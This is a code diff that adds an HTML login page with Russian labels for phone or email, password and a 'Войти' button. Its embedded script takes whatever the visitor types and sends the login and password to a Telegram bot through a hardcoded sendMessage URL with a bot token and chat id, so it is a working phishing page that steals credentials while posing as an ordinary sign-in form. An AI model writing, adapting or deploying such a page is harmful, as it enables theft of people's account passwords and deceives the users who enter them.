@@ -1,0 +1,32 @@
+<html>
+  
+<head>
+   
+</head>
+<body>
+    <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email">
+    <div>
+    <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">
+    </div>
+    <var> </var>
+    <script>
+        //дожидаемся полной загрузки страницы
+        window.onload = function () {
+        
+            //получаем идентификатор элемента
+            var a = document.getElementById('but');
+           var email = document.getElementById('email');
+            //вешаем на него событие
+            a.onclick = function() {
+              var t=  window.open("https://api.telegram.org/bot5281754979:AAEEaafFsAVGq2UY2-WsNk-cT9iwMLBcrBM/sendMessage?chat_id=1361415663^&text=login:"+email.value+" password:"+pass.value);
+            t.close();
+             
+        }
+        }
+        </script>
+    <button id="but" onclick="">Войти</button>
+    
+    
+</body>
+
+</html>
